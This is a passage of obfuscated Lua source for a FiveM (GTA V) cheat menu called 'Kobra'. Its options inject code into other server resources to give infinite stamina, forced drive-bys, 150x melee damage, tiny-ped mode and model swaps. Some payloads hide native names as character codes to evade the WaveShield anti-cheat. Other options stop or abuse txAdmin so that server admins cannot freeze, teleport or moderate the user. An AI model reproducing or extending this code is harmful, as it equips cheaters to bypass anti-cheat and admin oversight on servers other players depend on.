                                ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                kJfGhTrEeWqAsDz = false
                                ]]);end end},{type="checkbox",label="Force Driveby",checked=false,desc="This will enable driveby if disabled.",onSelect=function(v370) if v370 then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                                zXcVbNmQwErTyUi = true

                                local function UEvLBcXqM6()
                                    local cVbNmAsDfGhJkLz = CreateThread
                                    cVbNmAsDfGhJkLz(function()
                                        while zXcVbNmQwErTyUi and not Unloaded do
                                            local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                                            local eRtYuIoPaSdFgHi = PlayerPedId()

                                            lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                                            Wait(0)
                                        end
                                    end)
                                end

                                UEvLBcXqM6()
                                ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                zXcVbNmQwErTyUi = false
                                ]]);end end},{type="checkbox",label="Infinite Stamina",checked=false,desc="This will enable Infinite Stamina.",onSelect=function(v371) if v371 then v12:Notify("success","Kobra","Infinite Stamina On",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.infiniteStaminaEnabled then
                                                _G.infiniteStaminaEnabled = true

                                                local GetPlayerId_fn      = g({80,108,97,121,101,114,73,100})
                                                local RestoreStamina_fn   = g({82,101,115,116,111,114,101,80,108,97,121,101,114,83,116,97,109,105,110,97})
                                                local Wait_fn             = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[InfiniteStamina] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.infiniteStaminaEnabled do
                                                        local pid = GetPlayerId_fn()
                                                        if pid then
                                                            RestoreStamina_fn(pid, 1.0)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.staminaThreadActive == nil then _G.staminaThreadActive = false end
                                            if _G.infiniteStaminaEnabled == nil then
                                                _G.infiniteStaminaEnabled = true

                                                local function ThreadStart()
                                                    local CreateThread_fn = CreateThread
                                                    local Wait_fn         = Wait
                                                    local PlayerId_fn     = PlayerId
                                                    local Restore_fn      = RestorePlayerStamina

                                                    CreateThread_fn(function()
                                                        while true do
                                                            Wait_fn(0)
                                                            if not _G.infiniteStaminaEnabled then
                                                                Wait_fn(500)
                                                                goto continue
                                                            end

                                                            local pid = PlayerId_fn()
                                                            if pid then
                                                                Restore_fn(pid, 1.0)
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                ThreadStart()
                                            end
                                            _G.infiniteStaminaEnabled = true
                                        ]]);end else local v594=0 -0 ;while true do if (v594==0) then v12:Notify("error","Kobra","Infinite Stamina Off",3796 -(461 + 335) );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);end break;end end end end},{type="checkbox",label="Tiny Ped",checked=false,desc="This will turn you into a tiny ped.",onSelect=function(v372) local v373=((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v372 then v48(v373,[[
                                        if not _G.KobraTinyPedInjected then
                                            _G.KobraTinyPedInjected = true
                                            _G.KobraTinyPedEnabled = true

                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...)
                                                    return newFunction(originalNative, ...)
                                                end
                                            end

                                            hNative("SetPedConfigFlag", function(originalFn, ...) return originalFn(...) end)

                                            -- One-shot initflow (no looping)
                                            function initflow(name, fn)
                                                if not _G.__flows then _G.__flows = {} end
                                                if _G.__flows[name] then
                                                    _G.__flows[name].active = false
                                                end
                                                local flow = { active = true }
                                                _G.__flows[name] = flow

                                                SetTimeout(0, function()
                                                    if flow.active then
                                                        fn()
                                                    end
                                                end)
                                            end
                                        else
                                            _G.KobraTinyPedEnabled = true
                                        end

                                        initflow("TinyPedOnce", function()
                                            local ped = PlayerPedId()
                                            if ped and ped ~= 0 then
                                                SetPedConfigFlag(ped, 223, true)
                                            end
                                        end)
                                    ]]);else v48(v373,[[
                                        _G.KobraTinyPedEnabled = false
                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetPedConfigFlag(ped, 223, false)
                                        end
                                    ]]);end end},{type="checkbox",label="Super Punch",checked=false,onSelect=function(v374) local v375=GetResourceState("WaveShield")=="started" ;local v376=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v374 then if v375 then local v777=1667 -(728 + 939) ;while true do if (v777==0) then v12:Notify("success","Kobra","Super Punch Enabled",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local setMeleeMod = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicleMod = SetPlayerVehicleDamageModifier
                                                local setWeaponMod = SetWeaponDamageModifier
                                                local playerId = PlayerId
                                                local unarmedHash = GetHashKey("WEAPON_UNARMED")
                                                local damageValue = 150.0

                                                while superPunchEnabled and not Unloaded do
                                                    Wait(0)
                                                    local pid = playerId()
                                                    setMeleeMod(pid, damageValue)
                                                    setVehicleMod(pid, damageValue)
                                                    setWeaponMod(unarmedHash, damageValue)
                                                end

                                                -- Restore on disable
                                                local pid = playerId()
                                                setMeleeMod(pid, 1.0)
                                                setVehicleMod(pid, 1.0)
                                                setWeaponMod(unarmedHash, 1.0)
                                            end)
                                        ]]);break;end end else v48(v376,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerMeleeWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerVehicleDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function startSuperPunch()
                                                local create = CreateThread
                                                local wait = Wait
                                                local setMelee = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicle = SetPlayerVehicleDamageModifier
                                                local setWeapon = SetWeaponDamageModifier
                                                local getPlayer = PlayerId
                                                local hashKey = GetHashKey

                                                create(function()
                                                    local unarmedHash = hashKey("WEAPON_UNARMED")
                                                    local damageValue = 150.0

                                                    while superPunchEnabled and not Unloaded do
                                                        local pid = getPlayer()
                                                        setMelee(pid, damageValue)
                                                        setVehicle(pid, damageValue)
                                                        setWeapon(unarmedHash, damageValue)
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local pid = getPlayer()
                                                    setMelee(pid, 1.0)
                                                    setVehicle(pid, 1.0)
                                                    setWeapon(unarmedHash, 1.0)
                                                end)
                                            end

                                            startSuperPunch()
                                        ]]);v12:Notify("success","Kobra","Super Punch Enabled (Fallback)",10624 -7624 );end elseif v375 then local v778=0 -0 ;while true do if (v778==(0 -0)) then v12:Notify("error","Kobra","Super Punch Disabled",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            superPunchEnabled = false
                                        ]]);break;end end else local v779=1068 -(138 + 930) ;while true do if (v779==(0 + 0)) then v48(v376,[[
                                            superPunchEnabled = false
                                        ]]);v12:Notify("error","Kobra","Super Punch Disabled (Fallback)",2346 + 654 );break;end end end end},{type="divider",label="txAdmin Options"},{type="checkbox",label="txAdmin Player IDs",checked=false,desc="This will toggle txAdmin Player ids.",onSelect=function(v377) if v377 then MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(true, true)
                                ]]);else MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(false, true)
                                ]]);end end},{type="checkbox",label="txAdmin Noclip",checked=false,desc="This will toggle txAdmin noclip.",onSelect=function(v378) if v378 then if (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","noclip",true);else MachoInjectResource2(1769 -(459 + 1307) ,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(true, true)
                                        ]]);end elseif (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","none",true);else MachoInjectResource2(1873 -(474 + 1396) ,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(false, true)
                                        ]]);end end},{type="checkbox",label="Disable All txAdmin",checked=false,desc="This will disable txAdmin options from admins using them against you.",onSelect=function(v379) if v379 then local v595=0;while true do if (v595==(0 + 0)) then MachoResourceStop("monitor");print("started");break;end end else print("stopped");MachoResourceStart("monitor");end end},{type="checkbox",label="Disable txAdmin Teleport",checked=false,desc="This will disable txAdmin Teleport.",onSelect=function(v380) if v380 then MachoResourceStop("monitor");print("started");else local v596=0 -0 ;while true do if (0==v596) then print("stopped");MachoResourceStart("monitor");break;end end end end},{type="checkbox",label="Disable txAdmin Freeze",checked=false,desc="This will disable txAdmin Freeze.",onSelect=function(v381) if v381 then local v597=0 -0 ;while true do if (v597==(0 -0)) then MachoResourceStop("monitor");print("started");break;end end else print("stopped");MachoResourceStart("monitor");end end}}},{label="Wardrobe",tabs={{icon="",type="scrollable",value=1,values={"Random"},label="Outfit",desc="Apply a preset outfit",onSelect=function(v382) if (v382=="Random") then v48("any",[[
                                        local function UxrKYLp378()
                                            local UwEsDxCfVbGtHy = PlayerPedId
                                            local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                                            local QwAzXsEdCrVfBg = SetPedComponentVariation
                                            local LkJhGfDsAqWeRt = SetPedHeadBlendData
                                            local MnBgVfCdXsZaQw = SetPedHairColor
                                            local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                                            local TyUiOpAsDfGhJk = SetPedHeadOverlay
                                            local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                                            local DfGhJkLzXcVbNm = ClearPedProp

                                            local function PqLoMzNkXjWvRu(component, exclude)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                if total <= 1 then return 0 end
                                                local choice = exclude
                                                while choice == exclude do
                                                    choice = math.random(0, total - 1)
                                                end
                                                return choice
                                            end

                                            local function OxVnBmCxZaSqWe(component)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                return total > 1 and math.random(0, total - 1) or 0
                                            end

                                            local ped = UwEsDxCfVbGtHy()

                                            QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                                            local face = math.random(0, 45)
                                            local skin = math.random(0, 45)
                                            LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                                            local hairMax = FdSaQwErTyUiOp(ped, 2)
                                            local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                                            QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                                            MnBgVfCdXsZaQw(ped, 0, 0)

                                            local brows = RtYuIoPlMnBvCx(2)
                                            TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                                            ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                                            DfGhJkLzXcVbNm(ped, 0)
                                            DfGhJkLzXcVbNm(ped, 1)
                                        end

                                        UxrKYLp378()
                                    ]]);end end},{type="divider",label="Ped Options"},{type="scrollable",label="Freemode",scrollType="onEnter",value=1420 -(374 + 1045) ,values={"Freemode Male","Freemode Female"},onSelect=function(v383) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Freemode Male" then pedModel = "mp_m_freemode_01"
                                    elseif selected == "Freemode Female" then pedModel = "mp_f_freemode_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v383));end},{type="scrollable",label="Peds",scrollType="onEnter",value=1,values={"Michael","Franklin","Trevor","Lamar","Jimmy","Amanda","Tracey","Ron","Wade","Dave Norton","Steve Haines","Devin Weston","Floyd","Chef","Lester","Chop","Brad","Police Officer Male","Police Officer Female","SWAT","Sheriff Male","Sheriff Female","Highway Cop","FIB Male","FIB Female","Paramedic","Firefighter","Doctor","Construction Worker","Pilot Male","Pilot Female","Business Male","Business Female","Street Dealer","Gang Male 1","Gang Male 2","Gang Female 1","Ballas 1","Ballas 2","Ballas Female","Families 1","Families 2","Vagos 1","Vagos 2","Lost MC 1","Lost MC 2","Lost MC Female","Army Soldier","Marine 1","Marine 2","Prisoner Male","Prison Guard","Cop Undercover","Security Guard","Janitor","Hobo Male","Hobo Female","Prostitute 1","Prostitute 2","Beach Male","Beach Female","Tourist Male","Tourist Female","Skater","Hipster Male","Hipster Female","Bouncer","Shopkeeper","Chef","Bartender","Waiter","Mechanic","Taxi Driver","Gardener","Farmer","Dock Worker","Trash Worker","Postal Worker","Bus Driver","Pilot","Air Hostess","Cop Traffic","Cop Detective","Agent","Reporter","News Cameraman","Hunter","Hiker Male","Hiker Female","Golfer Male","Golfer Female","Tennis Player Male","Tennis Player Female"},onSelect=function(v384) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Michael" then pedModel = "player_zero"
                                    elseif selected == "Franklin" then pedModel = "player_one"
                                    elseif selected == "Trevor" then pedModel = "player_two"
                                    elseif selected == "Lamar" then pedModel = "ig_lamardavis"
                                    elseif selected == "Jimmy" then pedModel = "ig_jimmydisanto"
                                    elseif selected == "Amanda" then pedModel = "ig_amandatownley"
                                    elseif selected == "Tracey" then pedModel = "ig_tracydisanto"
                                    elseif selected == "Ron" then pedModel = "ig_ronsch"
                                    elseif selected == "Wade" then pedModel = "ig_wade"
                                    elseif selected == "Dave Norton" then pedModel = "ig_davenorton"
                                    elseif selected == "Steve Haines" then pedModel = "ig_stevehains"
                                    elseif selected == "Devin Weston" then pedModel = "ig_devin"
                                    elseif selected == "Floyd" then pedModel = "ig_floyd"
                                    elseif selected == "Chef" then pedModel = "ig_chef"
                                    elseif selected == "Lester" then pedModel = "ig_lestercrest"
                                    elseif selected == "Chop" then pedModel = "a_c_chop"
                                    elseif selected == "Brad" then pedModel = "ig_brad"
                                    elseif selected == "Police Officer Male" then pedModel = "s_m_y_cop_01"
                                    elseif selected == "Police Officer Female" then pedModel = "s_f_y_cop_01"
                                    elseif selected == "SWAT" then pedModel = "s_m_y_swat_01"
                                    elseif selected == "Sheriff Male" then pedModel = "s_m_y_sheriff_01"
                                    elseif selected == "Sheriff Female" then pedModel = "s_f_y_sheriff_01"
                                    elseif selected == "Highway Cop" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "FIB Male" then pedModel = "s_m_m_fibsec_01"
                                    elseif selected == "FIB Female" then pedModel = "s_f_m_fiboffice_02"
                                    elseif selected == "Paramedic" then pedModel = "s_m_m_paramedic_01"
                                    elseif selected == "Firefighter" then pedModel = "s_m_y_fireman_01"
                                    elseif selected == "Doctor" then pedModel = "s_m_m_doctor_01"
                                    elseif selected == "Construction Worker" then pedModel = "s_m_y_construct_01"
                                    elseif selected == "Pilot Male" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Pilot Female" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Business Male" then pedModel = "s_m_y_business_01"
                                    elseif selected == "Business Female" then pedModel = "s_f_y_business_01"
                                    elseif selected == "Street Dealer" then pedModel = "g_m_y_mexgoon_02"
                                    elseif selected == "Gang Male 1" then pedModel = "g_m_y_ballaorig_01"
                                    elseif selected == "Gang Male 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Gang Female 1" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Ballas 1" then pedModel = "g_m_y_ballaeast_01"
                                    elseif selected == "Ballas 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Ballas Female" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Families 1" then pedModel = "g_m_y_famca_01"
                                    elseif selected == "Families 2" then pedModel = "g_m_y_famdnf_01"
                                    elseif selected == "Vagos 1" then pedModel = "g_m_y_mexgoon_01"
                                    elseif selected == "Vagos 2" then pedModel = "g_m_y_mexgoon_03"
                                    elseif selected == "Lost MC 1" then pedModel = "g_m_y_lost_01"
                                    elseif selected == "Lost MC 2" then pedModel = "g_m_y_lost_02"
                                    elseif selected == "Lost MC Female" then pedModel = "g_f_y_lost_01"
                                    elseif selected == "Army Soldier" then pedModel = "s_m_y_marine_01"
                                    elseif selected == "Marine 1" then pedModel = "s_m_y_marine_02"
                                    elseif selected == "Marine 2" then pedModel = "s_m_y_marine_03"
                                    elseif selected == "Prisoner Male" then pedModel = "s_m_y_prismuscl_01"
                                    elseif selected == "Prison Guard" then pedModel = "s_m_m_prisguard_01"
                                    elseif selected == "Cop Undercover" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Security Guard" then pedModel = "s_m_m_security_01"
                                    elseif selected == "Janitor" then pedModel = "s_m_m_janitor"
                                    elseif selected == "Hobo Male" then pedModel = "a_m_m_tramp_01"
                                    elseif selected == "Hobo Female" then pedModel = "a_f_m_tramp_01"
                                    elseif selected == "Prostitute 1" then pedModel = "s_f_y_hooker_01"
                                    elseif selected == "Prostitute 2" then pedModel = "s_f_y_hooker_02"
                                    elseif selected == "Beach Male" then pedModel = "a_m_y_beach_01"
                                    elseif selected == "Beach Female" then pedModel = "a_f_y_beach_01"
                                    elseif selected == "Tourist Male" then pedModel = "a_m_y_tourist_01"
                                    elseif selected == "Tourist Female" then pedModel = "a_f_y_tourist_01"
                                    elseif selected == "Skater" then pedModel = "a_m_y_skater_01"
                                    elseif selected == "Hipster Male" then pedModel = "a_m_y_hipster_01"
                                    elseif selected == "Hipster Female" then pedModel = "a_f_y_hipster_01"
                                    elseif selected == "Bouncer" then pedModel = "s_m_m_bouncer_01"
                                    elseif selected == "Shopkeeper" then pedModel = "mp_m_shopkeep_01"
                                    elseif selected == "Chef" then pedModel = "s_m_y_chef_01"
                                    elseif selected == "Bartender" then pedModel = "s_m_y_barman_01"
                                    elseif selected == "Waiter" then pedModel = "s_m_y_waiter_01"
                                    elseif selected == "Mechanic" then pedModel = "s_m_y_xmech_02"
                                    elseif selected == "Taxi Driver" then pedModel = "s_m_m_trucker_01"
                                    elseif selected == "Gardener" then pedModel = "s_m_m_gardener_01"
                                    elseif selected == "Farmer" then pedModel = "a_m_m_farmer_01"
                                    elseif selected == "Dock Worker" then pedModel = "s_m_y_dockwork_01"
                                    elseif selected == "Trash Worker" then pedModel = "s_m_y_garbage"
                                    elseif selected == "Postal Worker" then pedModel = "s_m_m_postal_01"
                                    elseif selected == "Bus Driver" then pedModel = "s_m_o_busker_01"
                                    elseif selected == "Pilot" then pedModel = "s_m_m_pilot_01"
                                    elseif selected == "Air Hostess" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Cop Traffic" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "Cop Detective" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Agent" then pedModel = "s_m_m_fiboffice_02"
                                    elseif selected == "Reporter" then pedModel = "s_f_y_scrubs_01"
                                    elseif selected == "News Cameraman" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Hunter" then pedModel = "a_m_m_hillbilly_02"
                                    elseif selected == "Hiker Male" then pedModel = "a_m_m_hiker_01"
                                    elseif selected == "Hiker Female" then pedModel = "a_f_m_hiker_01"
                                    elseif selected == "Golfer Male" then pedModel = "a_m_m_golfer_01"
                                    elseif selected == "Golfer Female" then pedModel = "a_f_m_golfer_01"
                                    elseif selected == "Tennis Player Male" then pedModel = "a_m_m_tennis_01"
                                    elseif selected == "Tennis Player Female" then pedModel = "a_f_m_tennis_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v384));end},{type="scrollable",label="Animal Peds",scrollType="onEnter",value=1 + 0 ,values={"Boar","Cat","Chicken","Chimp","Cow","Coyote","Crow","Deer","Dolphin","Fish","Hen","Humpback","Husky","Killer Whale","Mountain Lion","Pig","Pigeon","Poodle","Pug","Poodle","Rabbit","Rat","Retriever","Rhesus Monkey","Rottweiler","Seagull","Shepherd","Stingray","Tiger Shark","Hammerhead Shark","Cow","Cat2","Chickenhawk","Cormorant","Coyote2","Chimp2","Boar2","Deer2","Fish2","Husky2","Pug2","Poodle2","Retriever2","Shepherd2","Rat2","Rabbit2","Dolphin2","Killer Whale2","Mountain Lion2","Pig2","Seagull2","Stingray2","Tiger Shark2","Hammerhead Shark2"},onSelect=function(v385) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Boar" then
                                        pedModel = "a_c_boar"
                                    elseif selected == "Cat" then
                                        pedModel = "a_c_cat_01"
                                    elseif selected == "Chicken" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Chimp" then
                                        pedModel = "a_c_chimp"
                                    elseif selected == "Cow" then
                                        pedModel = "a_c_cow"
                                    elseif selected == "Coyote" then
                                        pedModel = "a_c_coyote"
                                    elseif selected == "Crow" then
                                        pedModel = "a_c_crow"
                                    elseif selected == "Deer" then
                                        pedModel = "a_c_deer"
                                    elseif selected == "Dolphin" then
                                        pedModel = "a_c_dolphin"
                                    elseif selected == "Fish" then
                                        pedModel = "a_c_fish"
                                    elseif selected == "Hen" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Humpback" then
                                        pedModel = "a_c_humpback"
                                    elseif selected == "Husky" then
                                        pedModel = "a_c_husky"
                                    elseif selected == "Killer Whale" then
                                        pedModel = "a_c_killerwhale"
                                    elseif selected == "Mountain Lion" then
                                        pedModel = "a_c_mtlion"
                                    elseif selected == "Pig" then
                                        pedModel = "a_c_pig"
                                    elseif selected == "Pigeon" then
                                        pedModel = "a_c_pigeon"
                                    elseif selected == "Poodle" then
                                        pedModel = "a_c_poodle"
                                    elseif selected == "Pug" then
                                        pedModel = "a_c_pug"
                                    elseif selected == "Rabbit" then
                                        pedModel = "a_c_rabbit_01"
                                    elseif selected == "Rat" then
                                        pedModel = "a_c_rat"
                                    elseif selected == "Retriever" then
                                        pedModel = "a_c_retriever"
                                    elseif selected == "Rhesus Monkey" then
                                        pedModel = "a_c_rhesus"
                                    elseif selected == "Rottweiler" then
                                        pedModel = "a_c_rottweiler"
                                    elseif selected == "Seagull" then
                                        pedModel = "a_c_seagull"
                                    elseif selected == "Shepherd" then
                                        pedModel = "a_c_shepherd"
                                    elseif selected == "Stingray" then
                                        pedModel = "a_c_stingray"
                                    elseif selected == "Tiger Shark" then
                                        pedModel = "a_c_sharktiger"
                                    elseif selected == "Hammerhead Shark" then
                                        pedModel = "a_c_sharkhammer"
                                    elseif selected == "Chickenhawk" then
                                        pedModel = "a_c_chickenhawk"
                                    elseif selected == "Cormorant" then
                                        pedModel = "a_c_cormorant"
                                    else
                                        pedModel = nil
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid animal selected: " .. tostring(selected))
                                    end
